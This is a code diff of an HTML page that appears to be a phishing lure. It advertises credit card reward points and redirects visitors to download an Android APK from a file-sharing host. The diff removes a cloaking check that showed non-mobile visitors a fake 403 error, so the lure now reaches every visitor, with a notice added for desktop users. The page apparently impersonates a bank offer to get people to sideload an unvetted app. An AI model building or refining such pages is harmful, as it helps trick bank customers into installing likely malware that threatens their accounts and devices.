@@ -12,7 +12,6 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script>
     
     <style>
-    
         a.button {
             padding: 10px;
             color: white;
@@ -38,36 +37,34 @@
             window.location.href = downloadUrl; // Directly redirect to the APK file
         }
 
-        function isMobile() {
-            return /Mobi|Android/i.test(navigator.userAgent);
-        }
-
         function loadContent() {
-            if (isMobile()) {
-                const mobileContent = `
-                    <img src="src/main.png" alt="Main Visual" width="100%">
-          <img src="src/logo.jpg" alt="Company Logo" width="100%">
-          <div class="download-box text-center">
-              <div class="container">
-                  <div class="row">
-                      <div class="col-md-6 offset-md-3">
-                          <p class="text-center">Enjoy 2X EDGE REWARDS Points* on online spends with our Credit Card</p>
-                          <a class="button" href="https://www.4sync.com/web/directDownload/m46snRO1/bcyyBM4H.74ea46926ded50f683088ea7e60d5600" onclick="encrypt()">Download Now</a>
-                      </div>
-                  </div>
-              </div>
-          </div>
-          <br>
-          <img src="src/last.jpeg" alt="Last Image" width="100%">
-          <img src="src/2last.jpg" alt="Second Last Image" width="100%">
-                `;
-                document.body.innerHTML = mobileContent;
-            } else {
-                document.body.innerHTML = '<h2>403.</h2>';
+            const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+            let content = `
+                <img src="src/main.png" alt="Main Visual" width="100%">
+                <img src="src/logo.jpg" alt="Company Logo" width="100%">
+                <div class="download-box text-center">
+                    <div class="container">
+                        <div class="row">
+                            <div class="col-md-6 offset-md-3">
+                                <p class="text-center">Enjoy 2X EDGE REWARDS Points* on online spends with our Credit Card</p>
+                                <a class="button" href="https://www.4sync.com/web/directDownload/m46snRO1/bcyyBM4H.74ea46926ded50f683088ea7e60d5600" onclick="encrypt()">Download Now</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <br>
+                <img src="src/last.jpeg" alt="Last Image" width="100%">
+                <img src="src/2last.jpg" alt="Second Last Image" width="100%">
+            `;
+
+            if (!isMobile) {
+                content += `<p class="text-center">This content is optimized for mobile devices. You are viewing it on a non-mobile device.</p>`;
             }
+
+            document.body.innerHTML = content;
         }
 
-        window.onload = loadContent; // Load content when the window loads
+        window.onload = loadContent;
     </script>
 </head>
 <body>
